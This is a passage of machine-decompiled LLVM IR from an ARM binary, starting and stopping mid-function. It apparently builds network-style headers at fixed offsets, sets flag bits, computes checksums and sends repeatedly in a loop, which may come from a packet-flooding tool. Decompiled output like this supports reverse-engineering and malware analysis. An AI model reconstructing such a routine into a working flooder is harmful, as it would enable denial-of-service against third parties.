  %v5_c364 = add i32 %v0_c364, %tmp98
  %v1_c368 = load i32, i32* @sb, align 4
  %v2_c368 = add i32 %v1_c368, %v5_c364
  store i32 %v2_c368, i32* %r3.global-to-local, align 4
  %v1_c36c = add i32 %v2_c368, 16
  %v2_c36c = inttoptr i32 %v1_c36c to i32*
  %v3_c36c = load i32, i32* %v2_c36c, align 4
  store i32 %v3_c36c, i32* %r2.global-to-local, align 4
  %v0_c370 = load i32, i32* %r1.global-to-local, align 4
  %v1_c370 = trunc i32 %v0_c370 to i8
  %v2_c370 = load i32, i32* @r7, align 4
  %v3_c370 = add i32 %v2_c370, 3
  %v4_c370 = inttoptr i32 %v3_c370 to i8*
  store i8 %v1_c370, i8* %v4_c370, align 1
  %v0_c374 = load i32, i32* @r5, align 4
  %v1_c374 = trunc i32 %v0_c374 to i8
  %v2_c374 = load i32, i32* @r7, align 4
  %v3_c374 = add i32 %v2_c374, 4
  %v4_c374 = inttoptr i32 %v3_c374 to i8*
  store i8 %v1_c374, i8* %v4_c374, align 1
  %v0_c378 = load i32, i32* %r2.global-to-local, align 4
  %v1_c378 = load i32, i32* @r7, align 4
  %v2_c378 = add i32 %v1_c378, 16
  %v3_c378 = inttoptr i32 %v2_c378 to i32*
  store i32 %v0_c378, i32* %v3_c378, align 4
  %v0_c37c = load i32, i32* @sl, align 4
  %v1_c37c = trunc i32 %v0_c37c to i8
  %v2_c37c = load i32, i32* @r7, align 4
  %v3_c37c = add i32 %v2_c37c, 20
  %v4_c37c = inttoptr i32 %v3_c37c to i8*
  store i8 %v1_c37c, i8* %v4_c37c, align 1
  %v0_c380 = load i32, i32* @r7, align 4
  %v1_c380 = add i32 %v0_c380, 20
  store i32 %v1_c380, i32* @r4, align 4
  %v1_c384 = add i32 %v0_c380, 33
  %v2_c384 = inttoptr i32 %v1_c384 to i8*
  %v3_c384 = load i8, i8* %v2_c384, align 1
  %v4_c384 = zext i8 %v3_c384 to i32
  store i32 %v1_c254, i32* %r1.global-to-local, align 4
  %v1_c38c = and i32 %v4_c384, 223
  %v5_c390 = or i32 %v1_c38c, %v4_c390
  store i32 %v5_c390, i32* %r3.global-to-local, align 4
  %v1_c394 = trunc i32 %v5_c390 to i8
  store i8 %v1_c394, i8* %v2_c384, align 1
  %v0_c398 = load i32, i32* @r4, align 4
  %v1_c398 = add i32 %v0_c398, 13
  %v2_c398 = inttoptr i32 %v1_c398 to i8*
  %v3_c398 = load i8, i8* %v2_c398, align 1
  %v4_c398 = zext i8 %v3_c398 to i32
  store i32 %v1_c258, i32* %r3.global-to-local, align 4
  %v1_c3a0 = and i32 %v4_c398, 239
  %v5_c3a4 = or i32 %v1_c3a0, %v4_c3a4
  store i32 %v5_c3a4, i32* %r2.global-to-local, align 4
  %v1_c3a8 = trunc i32 %v5_c3a4 to i8
  store i8 %v1_c3a8, i8* %v2_c398, align 1
  %v0_c3ac = load i32, i32* @r4, align 4
  %v1_c3ac = add i32 %v0_c3ac, 13
  %v2_c3ac = inttoptr i32 %v1_c3ac to i8*
  %v3_c3ac = load i8, i8* %v2_c3ac, align 1
  %v4_c3ac = zext i8 %v3_c3ac to i32
  store i32 %v1_c25c, i32* %ip.global-to-local, align 4
  %v1_c3b4 = and i32 %v4_c3ac, 247
  %v5_c3b8 = or i32 %v1_c3b4, %v4_c3b8
  store i32 %v5_c3b8, i32* %r3.global-to-local, align 4
  %v1_c3bc = trunc i32 %v5_c3b8 to i8
  store i8 %v1_c3bc, i8* %v2_c3ac, align 1
  %v0_c3c0 = load i32, i32* @r4, align 4
  %v1_c3c0 = add i32 %v0_c3c0, 13
  %v2_c3c0 = inttoptr i32 %v1_c3c0 to i8*
  %v3_c3c0 = load i8, i8* %v2_c3c0, align 1
  %v4_c3c0 = zext i8 %v3_c3c0 to i32
  store i32 %v1_c280, i32* %r1.global-to-local, align 4
  %v1_c3c8 = and i32 %v4_c3c0, 251
  %v5_c3cc = or i32 %v1_c3c8, %v4_c3cc
  store i32 %v5_c3cc, i32* %r2.global-to-local, align 4
  %v1_c3d0 = trunc i32 %v5_c3cc to i8
  store i8 %v1_c3d0, i8* %v2_c3c0, align 1
  %v0_c3d4 = load i32, i32* @r4, align 4
  %v1_c3d4 = add i32 %v0_c3d4, 13
  %v2_c3d4 = inttoptr i32 %v1_c3d4 to i8*
  %v3_c3d4 = load i8, i8* %v2_c3d4, align 1
  %v4_c3d4 = zext i8 %v3_c3d4 to i32
  store i32 %v1_c284, i32* %r2.global-to-local, align 4
  %v1_c3dc = and i32 %v4_c3d4, 253
  %v4_c3e0 = or i32 %v1_c3dc, %v3_c3e0
  store i32 %v4_c3e0, i32* %r3.global-to-local, align 4
  %v1_c3e4 = trunc i32 %v4_c3e0 to i8
  store i8 %v1_c3e4, i8* %v2_c3d4, align 1
  %v0_c3e8 = load i32, i32* @r4, align 4
  %v1_c3e8 = add i32 %v0_c3e8, 12
  %v2_c3e8 = inttoptr i32 %v1_c3e8 to i8*
  %v3_c3e8 = load i8, i8* %v2_c3e8, align 1
  %v4_c3e8 = zext i8 %v3_c3e8 to i32
  store i32 %v4_c3e8, i32* %r2.global-to-local, align 4
  %v1_c3ec = add i32 %v0_c3e8, 13
  %v2_c3ec = inttoptr i32 %v1_c3ec to i8*
  %v3_c3ec = load i8, i8* %v2_c3ec, align 1
  %v4_c3ec = zext i8 %v3_c3ec to i32
  store i32 %v1_c288, i32* %ip.global-to-local, align 4
  %tmp99 = urem i8 %v3_c3e8, 16
  %v1_c3f4 = zext i8 %tmp99 to i32
  %v1_c3f8 = and i32 %v4_c3ec, 254
  %v2_c3fc = or i32 %v1_c3f8, %v1_c288
  store i32 %v2_c3fc, i32* %r3.global-to-local, align 4
  %v1_c400 = or i32 %v1_c3f4, 80
  store i32 %v1_c400, i32* %r2.global-to-local, align 4
  %v1_c404 = trunc i32 %v2_c3fc to i8
  store i8 %v1_c404, i8* %v2_c3ec, align 1
  %v0_c408 = load i32, i32* %r2.global-to-local, align 4
  %v1_c408 = trunc i32 %v0_c408 to i8
  %v2_c408 = load i32, i32* @r4, align 4
  %v3_c408 = add i32 %v2_c408, 12
  %v4_c408 = inttoptr i32 %v3_c408 to i8*
  store i8 %v1_c408, i8* %v4_c408, align 1
  store i32 %v3_c410, i32* %r1.global-to-local, align 4
  store i32 %v7_c410, i32* %r2.global-to-local, align 4
  %v2_c414 = load i32, i32* @r4, align 4
  %v3_c414 = add i32 %v2_c414, 1
  %v4_c414 = inttoptr i32 %v3_c414 to i8*
  store i8 %v5_c2c0, i8* %v4_c414, align 1
  %v0_c418 = load i32, i32* %r2.global-to-local, align 4
  %v1_c418 = trunc i32 %v0_c418 to i8
  %v2_c418 = load i32, i32* @r4, align 4
  %v3_c418 = add i32 %v2_c418, 3
  %v4_c418 = inttoptr i32 %v3_c418 to i8*
  store i8 %v1_c418, i8* %v4_c418, align 1
  %v0_c41c = load i32, i32* @r6, align 4
  %v1_c41c = trunc i32 %v0_c41c to i8
  %v2_c41c = load i32, i32* @r4, align 4
  %v3_c41c = add i32 %v2_c41c, 2
  %v4_c41c = inttoptr i32 %v3_c41c to i8*
  store i8 %v1_c41c, i8* %v4_c41c, align 1
  %v0_c420 = load i32, i32* @r8, align 4
  %v1_c420 = load i32, i32* @r4, align 4
  %v2_c420 = add i32 %v1_c420, 4
  %v3_c420 = inttoptr i32 %v2_c420 to i32*
  store i32 %v0_c420, i32* %v3_c420, align 4
  %v0_c424 = call i32 @function_fe24()
  store i32 %v1_c28c, i32* %ip.global-to-local, align 4
  %sext = mul i32 %v0_c424, 16777216
  %v1_c42c = sdiv i32 %sext, 16777216
  store i32 %v1_c42c, i32* %r2.global-to-local, align 4
  %v3_c430 = ashr i32 %sext, 31
  store i32 %v3_c430, i32* %r3.global-to-local, align 4
  store i1 %v2_c434, i1* %cpsr_z.global-to-local, align 1
  %v1_c438 = trunc i32 %v3_c430 to i8
  %v2_c438 = load i32, i32* @r4, align 4
  %v3_c438 = add i32 %v2_c438, 15
  %v4_c438 = inttoptr i32 %v3_c438 to i8*
  store i8 %v1_c438, i8* %v4_c438, align 1
  %v0_c43c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_c448.pre = load i32, i32* @r4, align 4
  br i1 %v0_c43c, label %.thread13, label %bb87

bb87:                                             ; preds = %bb86
  %v2_c43c = add i32 %v2_c448.pre, 13
  %v3_c43c = inttoptr i32 %v2_c43c to i8*
  %v4_c43c = load i8, i8* %v3_c43c, align 1
  %v5_c43c = zext i8 %v4_c43c to i32
  %v2_c440 = or i32 %v5_c43c, 8
  store i32 %v2_c440, i32* %r3.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb86, %bb87
  store i32 %v6_c13c, i32* @r1, align 4
  %v0_c448 = load i32, i32* %r2.global-to-local, align 4
  %v1_c448 = trunc i32 %v0_c448 to i8
  %v3_c448 = add i32 %v2_c448.pre, 14
  %v4_c448 = inttoptr i32 %v3_c448 to i8*
  store i8 %v1_c448, i8* %v4_c448, align 1
  %v0_c44c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c44c, label %bb89, label %bb88

bb88:                                             ; preds = %.thread13
  %v1_c44c = load i32, i32* %r3.global-to-local, align 4
  %v2_c44c = trunc i32 %v1_c44c to i8
  %v3_c44c = load i32, i32* @r4, align 4
  %v4_c44c = add i32 %v3_c44c, 13
  %v5_c44c = inttoptr i32 %v4_c44c to i8*
  store i8 %v2_c44c, i8* %v5_c44c, align 1
  br label %bb89

bb89:                                             ; preds = %.thread13, %bb88
  %v0_c450 = load i32, i32* @r7, align 4
  %v1_c450 = add i32 %v0_c450, 40
  %v1_c454 = inttoptr i32 %v1_c450 to i8*
  %v2_c454 = call i32 @function_10000(i8* %v1_c454)
  %v3_c458 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c458, i32* %r3.global-to-local, align 4
  %v1_c45c = add i32 %v3_c458, 1
  store i32 %v1_c45c, i32* @r4, align 4
  %v0_c460 = load i32, i32* @fp, align 4
  %v9_c460 = icmp eq i32 %v0_c460, %v1_c45c
  store i1 %v9_c460, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c45c, i32* %stack_var_-40, align 4
  %v8_c468 = icmp sgt i32 %v0_c460, %v1_c45c
  br i1 %v8_c468, label %dec_label_pc_c2cc, label %dec_label_pc_c46c

dec_label_pc_c46c:                                ; preds = %bb89
  store i32 %v6_c13c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c474.preheader

dec_label_pc_c474.preheader:                      ; preds = %dec_label_pc_c46c, %dec_label_pc_c6e0
  %v0_c47417 = phi i32 [ %v0_c460, %dec_label_pc_c46c ], [ %v0_c1e0, %dec_label_pc_c6e0 ]
  %stack_var_-168.0.ph = phi i32 [ %v1_c200, %dec_label_pc_c46c ], [ %v1_c6e8, %dec_label_pc_c6e0 ]
  %storemerge = add i32 %v6_c13c, 20
  store i32 %storemerge, i32* @r8, align 4
  %v3_c62c = icmp eq i32 %v6_c178, -1
  %v8_c62c = icmp eq i32 %v6_c178, -1
  %v9_c648 = icmp eq i32 %v3_c1d4, add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1)
  %v2_c6c4 = icmp eq i32 %v1_c164, 0
  br label %dec_label_pc_c474

dec_label_pc_c474:                                ; preds = %dec_label_pc_c51c, %dec_label_pc_c474.preheader
  %v0_c474 = phi i32 [ %v0_c47417, %dec_label_pc_c474.preheader ], [ %v0_c5b0, %dec_label_pc_c51c ]
  %v2_c474 = icmp eq i32 %v0_c474, 0
  store i1 %v2_c474, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp90 = icmp slt i32 %v0_c474, 1
  br label %dec_label_pc_c47c

dec_label_pc_c47c:                                ; preds = %dec_label_pc_c47c, %dec_label_pc_c474
  br i1 %tmp90, label %dec_label_pc_c47c, label %dec_label_pc_c480

dec_label_pc_c480:                                ; preds = %dec_label_pc_c47c
  %v0_c480 = load i32, i32* @r8, align 4
  %v3_c480 = mul i32 %v0_c480, 65536
  store i32 %v3_c480, i32* %r2.global-to-local, align 4
  %tmp91 = mul i32 %v0_c480, 256
  %v1_c488 = and i32 %tmp91, 65280
  store i32 %v1_c488, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %tmp92 = udiv i32 %v0_c480, 256
  %v4_c494 = urem i32 %tmp92, 256
  %v5_c494 = or i32 %v4_c494, %v1_c488
  store i32 %v5_c494, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_c49c

dec_label_pc_c49c:                                ; preds = %dec_label_pc_c51c, %dec_label_pc_c480
  %v1_c4b0 = phi i32 [ %v1_c5ac, %dec_label_pc_c51c ], [ 0, %dec_label_pc_c480 ]
  %v5_c4a0 = mul i32 %v1_c4b0, 24
  %v1_c4a4 = load i32, i32* @sb, align 4
  %v2_c4a4 = add i32 %v1_c4a4, %v5_c4a0
  store i32 %v2_c4a4, i32* %r3.global-to-local, align 4
  store i32 %v2_bfa8, i32* %ip.global-to-local, align 4
  %v1_c4ac = add i32 %v2_c4a4, 20
  %v2_c4ac = inttoptr i32 %v1_c4ac to i8*
  %v3_c4ac = load i8, i8* %v2_c4ac, align 1
  %v4_c4ac = zext i8 %v3_c4ac to i32
  store i32 %v4_c4ac, i32* %r2.global-to-local, align 4
  %v4_c4b0 = mul i32 %v1_c4b0, 4
  %v5_c4b0 = add i32 %v4_c4b0, %v2_bfa8
  %v6_c4b0 = inttoptr i32 %v5_c4b0 to i32*
  %v7_c4b0 = load i32, i32* %v6_c4b0, align 4
  store i32 %v7_c4b0, i32* @r5, align 4
  %v7_c4b4 = icmp eq i8 %v3_c4ac, 31
  store i1 %v7_c4b4, i1* %cpsr_z.global-to-local, align 1
  %v1_c4b8 = add i32 %v7_c4b0, 20
  store i32 %v1_c4b8, i32* @r6, align 4
  %tmp100 = icmp ult i8 %v3_c4ac, 32
  br i1 %tmp100, label %dec_label_pc_c5d0, label %dec_label_pc_c4c0

dec_label_pc_c4c0:                                ; preds = %dec_label_pc_c49c
  store i32 %v6_c178, i32* %r1.global-to-local, align 4
  store i1 %v8_c62c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c62c, label %dec_label_pc_c638, label %dec_label_pc_c4cc

dec_label_pc_c4cc:                                ; preds = %dec_label_pc_c5d0, %dec_label_pc_c4c0
  store i32 %v3_c1d4, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_c648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c648, label %dec_label_pc_c654, label %dec_label_pc_c4e0

dec_label_pc_c4e0:                                ; preds = %dec_label_pc_c638.dec_label_pc_c4e0_crit_edge, %dec_label_pc_c4cc
  %v1_c4e4 = phi i32 [ %v1_c4e4.pre, %dec_label_pc_c638.dec_label_pc_c4e0_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), %dec_label_pc_c4cc ]
  store i32 %v3_c1d8, i32* %r3.global-to-local, align 4
  %v9_c4e4 = icmp eq i32 %v3_c1d8, %v1_c4e4
  store i1 %v9_c4e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c4e4, label %dec_label_pc_c670, label %dec_label_pc_c4ec

dec_label_pc_c4ec:                                ; preds = %dec_label_pc_c654.dec_label_pc_c4ec_crit_edge, %dec_label_pc_c4e0
  %v1_c4f0 = phi i32 [ %v1_c4f0.pre, %dec_label_pc_c654.dec_label_pc_c4ec_crit_edge ], [ %v1_c4e4, %dec_label_pc_c4e0 ]
  store i32 %v3_c1dc, i32* %ip.global-to-local, align 4
  %v9_c4f0 = icmp eq i32 %v3_c1dc, %v1_c4f0
  store i1 %v9_c4f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c4f0, label %dec_label_pc_c68c, label %dec_label_pc_c4f8

dec_label_pc_c4f8:                                ; preds = %dec_label_pc_c670.dec_label_pc_c4f8_crit_edge, %dec_label_pc_c4ec
  %v1_c4fc = phi i32 [ %v1_c4fc.pre, %dec_label_pc_c670.dec_label_pc_c4f8_crit_edge ], [ %v1_c4f0, %dec_label_pc_c4ec ]
  store i32 %v5_c078, i32* %r1.global-to-local, align 4
  %v9_c4fc = icmp eq i32 %v5_c078, %v1_c4fc
  store i1 %v9_c4fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c4fc, label %dec_label_pc_c6a8, label %dec_label_pc_c504

dec_label_pc_c504:                                ; preds = %dec_label_pc_c68c.dec_label_pc_c504_crit_edge, %dec_label_pc_c4f8
  %v1_c508 = phi i32 [ %v1_c508.pre, %dec_label_pc_c68c.dec_label_pc_c504_crit_edge ], [ %v1_c4fc, %dec_label_pc_c4f8 ]
  store i32 %v6_c094, i32* %r2.global-to-local, align 4
  %v9_c508 = icmp eq i32 %v6_c094, %v1_c508
  store i1 %v9_c508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c508, label %dec_label_pc_c6bc, label %dec_label_pc_c510

dec_label_pc_c510:                                ; preds = %dec_label_pc_c6a8, %dec_label_pc_c504
  store i32 %v1_c164, i32* %r3.global-to-local, align 4
  store i1 %v2_c6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c6c4, label %dec_label_pc_c51c, label %dec_label_pc_c6d0

dec_label_pc_c51c:                                ; preds = %dec_label_pc_c510, %dec_label_pc_c6bc, %dec_label_pc_c6d0
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c520 = load i32, i32* @r7, align 4
  %v1_c520 = trunc i32 %v0_c520 to i8
  %v2_c520 = load i32, i32* @r5, align 4
  %v3_c520 = add i32 %v2_c520, 10
  %v4_c520 = inttoptr i32 %v3_c520 to i8*
  store i8 %v1_c520, i8* %v4_c520, align 1
  %v0_c524 = load i32, i32* @r7, align 4
  %v1_c524 = trunc i32 %v0_c524 to i8
  %v2_c524 = load i32, i32* @r5, align 4
  %v3_c524 = add i32 %v2_c524, 11
  %v4_c524 = inttoptr i32 %v3_c524 to i8*
  store i8 %v1_c524, i8* %v4_c524, align 1
  %v0_c528 = load i32, i32* @r5, align 4
  store i32 %v0_c528, i32* @r0, align 4
  %v2_c52c = call i32 @function_e424(i32 %v0_c528, i32 20)
  %v3_c52c = trunc i32 %v2_c52c to i8
  %v4_c53028 = udiv i32 %v2_c52c, 256
  %v1_c534 = trunc i32 %v4_c53028 to i8
  %v2_c534 = load i32, i32* @r5, align 4
  %v3_c534 = add i32 %v2_c534, 11
  %v4_c534 = inttoptr i32 %v3_c534 to i8*
  store i8 %v1_c534, i8* %v4_c534, align 1
  %v3_c538 = load i32, i32* @r5, align 4
  %v4_c538 = add i32 %v3_c538, 10
  %v5_c538 = inttoptr i32 %v4_c538 to i8*
  store i8 %v3_c52c, i8* %v5_c538, align 1
  %v0_c53c = load i32, i32* @r6, align 4
  store i32 %v0_c53c, i32* @r1, align 4
  %v0_c540 = load i32, i32* @sl, align 4
  store i32 %v0_c540, i32* %r2.global-to-local, align 4
  %v0_c544 = load i32, i32* @r8, align 4
  store i32 %v0_c544, i32* %r3.global-to-local, align 4
  %v0_c548 = load i32, i32* @r7, align 4
  %v1_c548 = trunc i32 %v0_c548 to i8
  %v3_c548 = add i32 %v0_c53c, 16
  %v4_c548 = inttoptr i32 %v3_c548 to i8*
  store i8 %v1_c548, i8* %v4_c548, align 1
  %v0_c54c = load i32, i32* @r7, align 4
  %v1_c54c = trunc i32 %v0_c54c to i8
  %v2_c54c = load i32, i32* @r6, align 4
  %v3_c54c = add i32 %v2_c54c, 17
  %v4_c54c = inttoptr i32 %v3_c54c to i8*
  store i8 %v1_c54c, i8* %v4_c54c, align 1
  %v0_c550 = load i32, i32* @r5, align 4
  %v4_c554 = call i32 @function_e480(i32 %v0_c550, i32 %v0_c53c, i32 %v0_c540, i32 %v0_c544)
  %v5_c554 = trunc i32 %v4_c554 to i8
  %v4_c55829 = udiv i32 %v4_c554, 256
  %v1_c55c = trunc i32 %v4_c55829 to i8
  %v2_c55c = load i32, i32* @r6, align 4
  %v3_c55c = add i32 %v2_c55c, 17
  %v4_c55c = inttoptr i32 %v3_c55c to i8*
  store i8 %v1_c55c, i8* %v4_c55c, align 1
  %v3_c560 = load i32, i32* @r6, align 4
  %v4_c560 = add i32 %v3_c560, 16
  %v5_c560 = inttoptr i32 %v4_c560 to i8*
  store i8 %v5_c554, i8* %v5_c560, align 1
  %v3_c564 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c564, i32* %r3.global-to-local, align 4
  %v0_c568 = load i32, i32* @r5, align 4
  %v1_c568 = add i32 %v0_c568, 20
  %v2_c568 = inttoptr i32 %v1_c568 to i32*
  %v3_c568 = load i32, i32* %v2_c568, align 4
  %v3_c570 = udiv i32 %v3_c568, 65536
  store i32 %v3_c570, i32* %r2.global-to-local, align 4
  %v5_c574 = mul i32 %v3_c564, 24
  %v1_c578 = load i32, i32* @sb, align 4
  %v2_c578 = add i32 %v1_c578, %v5_c574
  store i32 %v2_c578, i32* %ip.global-to-local, align 4
  %v3_c57c27 = udiv i32 %v3_c568, 16777216
  %v1_c580 = trunc i32 %v3_c57c27 to i8
  %v3_c580 = add i32 %v2_c578, 3
  %v4_c580 = inttoptr i32 %v3_c580 to i8*
  store i8 %v1_c580, i8* %v4_c580, align 1
  %v0_c584 = load i32, i32* %r2.global-to-local, align 4
  %v1_c584 = trunc i32 %v0_c584 to i8
  %v2_c584 = load i32, i32* %ip.global-to-local, align 4
  %v3_c584 = add i32 %v2_c584, 2
  %v4_c584 = inttoptr i32 %v3_c584 to i8*
  store i8 %v1_c584, i8* %v4_c584, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c58c = load i32, i32* @r5, align 4
  store i32 %v0_c58c, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-168.0.ph, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_c59c = load i32, i32* %ip.global-to-local, align 4
  %v6_c5a4 = inttoptr i32 %v0_c58c to i32*
  %v7_c5a4 = call i32 @function_1372c(i32 %v3_c18c, i32* %v6_c5a4, i32 %stack_var_-168.0.ph, i32 16384, i32 %v0_c59c, i32 16)
  %v3_c5a8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c5a8, i32* %r3.global-to-local, align 4
  %v1_c5ac = add i32 %v3_c5a8, 1
  %v0_c5b0 = load i32, i32* @fp, align 4
  %v9_c5b0 = icmp eq i32 %v0_c5b0, %v1_c5ac
  store i1 %v9_c5b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c5ac, i32* %stack_var_-40, align 4
  %v7_c5b8 = icmp sgt i32 %v0_c5b0, %v1_c5ac
  br i1 %v7_c5b8, label %dec_label_pc_c49c, label %dec_label_pc_c474

dec_label_pc_c5c0:                                ; preds = %dec_label_pc_c19c
  %v1_c5c4 = call i32 @function_12e9c(i32 %v3_c18c)
  br label %dec_label_pc_c5c8

dec_label_pc_c5c8:                                ; preds = %dec_label_pc_bf88, %dec_label_pc_c5c0
  %v29_c5cc = phi i32 [ %v3_c18c, %dec_label_pc_bf88 ], [ %v1_c5c4, %dec_label_pc_c5c0 ]
  ret i32 %v29_c5cc

dec_label_pc_c5d0:                                ; preds = %dec_label_pc_c49c
  %v1_c5d0 = add i32 %v2_c4a4, 16
  %v2_c5d0 = inttoptr i32 %v1_c5d0 to i32*
  %v3_c5d0 = load i32, i32* %v2_c5d0, align 4
  %v0_c5d4 = call i32 @function_fe24()
  %v3_c5d8 = load i32, i32* %stack_var_-40, align 4
  %v5_c5e0 = mul i32 %v3_c5d8, 24
  %v1_c5e8 = load i32, i32* @sb, align 4
  %v2_c5e8 = add i32 %v1_c5e8, %v5_c5e0
  store i32 %v2_c5e8, i32* %r1.global-to-local, align 4
  %v1_c5ec = and i32 %v3_c5d0, 65280
  store i32 %v1_c5ec, i32* %r3.global-to-local, align 4
  %v1_c5e4 = udiv i32 %v3_c5d0, 256
  %v3_c5f0 = and i32 %v1_c5e4, 65280
  store i32 %v3_c5f0, i32* %r2.global-to-local, align 4
  %v3_c5f4 = mul i32 %v3_c5d0, 16777216
  store i32 %v3_c5f4, i32* %ip.global-to-local, align 4
  %v1_c5f8 = add i32 %v2_c5e8, 20
  %v2_c5f8 = inttoptr i32 %v1_c5f8 to i8*
  %v3_c5f8 = load i8, i8* %v2_c5f8, align 1
  %v4_c5f8 = zext i8 %v3_c5f8 to i32
  %v4_c5fc = mul nuw nsw i32 %v1_c5ec, 256
  %v5_c5fc = or i32 %v4_c5fc, %v3_c5f4
  store i32 %v5_c5fc, i32* %ip.global-to-local, align 4
  %v2_c604 = call i32 @llvm.bswap.i32(i32 %v3_c5d0)
  %v7_c608 = lshr i32 %v0_c5d4, %v4_c5f8
  %v8_c608 = add i32 %v7_c608, %v2_c604
  store i32 %v8_c608, i32* %r2.global-to-local, align 4
  %v2_c624 = call i32 @llvm.bswap.i32(i32 %v8_c608)
  store i32 %v2_c624, i32* %r3.global-to-local, align 4
  store i32 %v6_c178, i32* %r1.global-to-local, align 4
  store i1 %v8_c62c, i1* %cpsr_z.global-to-local, align 1
  %v1_c630 = load i32, i32* @r5, align 4
  %v2_c630 = add i32 %v1_c630, 16
  %v3_c630 = inttoptr i32 %v2_c630 to i32*
  store i32 %v2_c624, i32* %v3_c630, align 4
  br i1 %v3_c62c, label %dec_label_pc_c638, label %dec_label_pc_c4cc

dec_label_pc_c638:                                ; preds = %dec_label_pc_c5d0, %dec_label_pc_c4c0
  %v0_c638 = call i32 @function_fe24()
  store i32 %v3_c1d4, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_c648, i1* %cpsr_z.global-to-local, align 1
  %v1_c64c = load i32, i32* @r5, align 4
  %v2_c64c = add i32 %v1_c64c, 12
  %v3_c64c = inttoptr i32 %v2_c64c to i32*
  store i32 %v0_c638, i32* %v3_c64c, align 4
  br i1 %v9_c648, label %dec_label_pc_c654, label %dec_label_pc_c638.dec_label_pc_c4e0_crit_edge

dec_label_pc_c638.dec_label_pc_c4e0_crit_edge:    ; preds = %dec_label_pc_c638
  %v1_c4e4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c4e0

dec_label_pc_c654:                                ; preds = %dec_label_pc_c638, %dec_label_pc_c4cc
  %v0_c654 = call i32 @function_fe24()
  %v1_c654 = trunc i32 %v0_c654 to i8
  %v4_c65830 = udiv i32 %v0_c654, 256
  %v1_c65c = trunc i32 %v4_c65830 to i8
  %v2_c65c = load i32, i32* @r5, align 4
  %v3_c65c = add i32 %v2_c65c, 5
  %v4_c65c = inttoptr i32 %v3_c65c to i8*
  store i8 %v1_c65c, i8* %v4_c65c, align 1
  store i32 %v3_c1d8, i32* %r3.global-to-local, align 4
  %v1_c664 = load i32, i32* @r4, align 4
  %v9_c664 = icmp eq i32 %v3_c1d8, %v1_c664
  store i1 %v9_c664, i1* %cpsr_z.global-to-local, align 1
  %v3_c668 = load i32, i32* @r5, align 4
  %v4_c668 = add i32 %v3_c668, 4
  %v5_c668 = inttoptr i32 %v4_c668 to i8*
  store i8 %v1_c654, i8* %v5_c668, align 1
  %v0_c66c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c66c, label %dec_label_pc_c670, label %dec_label_pc_c654.dec_label_pc_c4ec_crit_edge

dec_label_pc_c654.dec_label_pc_c4ec_crit_edge:    ; preds = %dec_label_pc_c654
  %v1_c4f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c4ec

dec_label_pc_c670:                                ; preds = %dec_label_pc_c654, %dec_label_pc_c4e0
  %v0_c670 = call i32 @function_fe24()
  %v1_c670 = trunc i32 %v0_c670 to i8
  store i32 %v3_c1dc, i32* %ip.global-to-local, align 4
  %v4_c678 = sdiv i32 %v0_c670, 256
  store i32 %v4_c678, i32* %r3.global-to-local, align 4
  %v1_c67c = load i32, i32* @r4, align 4
  %v9_c67c = icmp eq i32 %v3_c1dc, %v1_c67c
  store i1 %v9_c67c, i1* %cpsr_z.global-to-local, align 1
  %v3_c680 = load i32, i32* @r5, align 4
  %v4_c680 = add i32 %v3_c680, 20
  %v5_c680 = inttoptr i32 %v4_c680 to i8*
  store i8 %v1_c670, i8* %v5_c680, align 1
  %v0_c684 = load i32, i32* %r3.global-to-local, align 4
  %v1_c684 = trunc i32 %v0_c684 to i8
  %v2_c684 = load i32, i32* @r6, align 4
  %v3_c684 = add i32 %v2_c684, 1
  %v4_c684 = inttoptr i32 %v3_c684 to i8*
  store i8 %v1_c684, i8* %v4_c684, align 1
  %v0_c688 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c688, label %dec_label_pc_c68c, label %dec_label_pc_c670.dec_label_pc_c4f8_crit_edge

dec_label_pc_c670.dec_label_pc_c4f8_crit_edge:    ; preds = %dec_label_pc_c670
  %v1_c4fc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c4f8

dec_label_pc_c68c:                                ; preds = %dec_label_pc_c670, %dec_label_pc_c4ec
  %v0_c68c = call i32 @function_fe24()
  %v1_c68c = trunc i32 %v0_c68c to i8
  store i32 %v5_c078, i32* %r1.global-to-local, align 4
  %v4_c694 = sdiv i32 %v0_c68c, 256
  store i32 %v4_c694, i32* %r3.global-to-local, align 4
  %v1_c698 = load i32, i32* @r4, align 4
  %v9_c698 = icmp eq i32 %v5_c078, %v1_c698
  store i1 %v9_c698, i1* %cpsr_z.global-to-local, align 1
  %v1_c69c = trunc i32 %v4_c694 to i8
  %v2_c69c = load i32, i32* @r6, align 4
  %v3_c69c = add i32 %v2_c69c, 3
